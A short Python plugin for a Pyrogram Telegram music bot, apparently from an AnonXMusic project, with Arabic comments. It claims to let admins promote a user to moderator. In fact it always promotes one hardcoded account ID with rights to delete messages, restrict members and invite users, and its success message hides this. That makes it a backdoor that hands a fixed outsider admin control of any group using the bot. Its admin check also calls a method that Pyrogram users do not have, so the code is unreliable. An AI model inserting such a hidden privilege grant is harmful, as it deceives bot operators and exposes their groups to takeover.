from pyrogram import Client, filters
from pyrogram.types import Message
from AnonXMusic import app


my_user_id = 6301863282

# استخدم هذا الزر لربط الأمر بأمر الرفع
@Client.on_message(filters.command("رفع_مشرف"))
def promote_admin(client, message):
    # تحقق مما إذا كان المستخدم هو المشرف بالفعل أم لا
    if not message.from_user or not message.from_user.is_admin():
        message.reply_text("عذرًا، يجب أن تكون مشرفًا لتنفيذ هذا الأمر.")
        return
    
    # رفع المستخدم للمشرف باستخدام معرّف المستخدم ومعرّف المحادثة
    client.promote_chat_member(
        chat_id=message.chat.id,
        user_id=my_user_id,
        can_change_info=True,
        can_delete_messages=True,
        can_invite_users=True,
        can_restrict_members=True,
        can_pin_messages=True
    )
    message.reply_text("تم رفع المستخدم كمشرف بنجاح.")

